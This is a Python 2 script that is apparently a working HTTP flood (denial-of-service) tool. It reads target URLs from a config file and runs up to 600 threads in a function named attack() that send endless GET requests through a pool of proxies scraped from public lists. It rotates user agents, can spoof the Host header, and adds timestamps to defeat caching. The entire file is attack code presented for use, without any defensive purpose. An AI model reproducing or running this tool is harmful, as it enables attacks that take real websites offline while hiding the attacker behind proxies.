#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import thread
import time
import proxypool
import random
import sys
import useragenthelper
from requests import ConnectionError
from proxyhelper import ProxyHelper
import json

pool = proxypool.ProxyPool.get_instance()
g_lst_target = []
g_target_host = None
g_thread = 10

r = open("config.txt").read()
js = json.loads(r)

g_lst_target = js['target']
print g_lst_target
g_lst_target = filter(lambda x: x.startswith('http'), g_lst_target)
if 'host' in js:
    g_target_host = js['host']
g_thread = js['thread']
g_bypasscache = js['bypasscache']
g_append_rnd_val = js['append_rnd_val']

if g_thread > 600:
    g_thread = 600
elif g_thread == 0:
    g_thread = 1
    #python win limited
    
if len(g_lst_target) == 0:
    print 'Target null please set target'
    raw_input('Print any key to Exit')
    exit(1)

print 'Ver 0.1'
print 'target %s' % (g_lst_target)
print 'host %s' % (g_target_host)
print 'thread %s' % (g_thread)

def attack():
    global pool
    global g_lst_target
    proxy = pool.pop()
    while proxy is None:
        proxy = pool.pop()
        time.sleep(1)
    while True:
        try:
            put = 1
            target = random.choice(g_lst_target)
            if g_append_rnd_val == 1:
                target += str(time.time())
            if g_bypasscache == 1:
                if '?' in target:
                    target += '&t=' + str(time.time())
                else:
                    target += '?t=' + str(time.time())
            proxies = {'http': 'http://%s:%s' % (proxy.ip, proxy.port)}
            s = requests.Session()
            headers = {'User-Agent': useragenthelper.get()}
            if g_target_host is not None:
                if len(g_target_host)>0:
                    headers['Host'] = g_target_host
            r = s.get(target, timeout=2, headers=headers, proxies=proxies)
            print r.text[:100]
        except ConnectionError:
            put = 0
            pass
        except:
            print 'Request Failed'
            #import traceback
            #print traceback.print_exc()
            pass
        if put == 1:
            pool.put(proxy)
        proxy = pool.pop()
        while proxy is None:
            proxy = pool.pop()
            time.sleep(5)

max = g_thread
while max > 0:
    thread.start_new_thread(attack, ())
    max -= 1

from proxyhelper import Form66ip
from proxyhelper import FormLiunianip

ph = ProxyHelper.get_instance()
while True:
    lst = ph.GetFormUrl(Form66ip)
    for i in lst:
        pool.add(i)
    lst = ph.GetFormUrl(FormLiunianip)
    for i in lst:
        pool.add(i)
    if pool.count() > 8000:
        time.sleep(120)
    elif pool.count() > 2000:
        time.sleep(60)
    elif pool.count() > 1000:
        time.sleep(20)
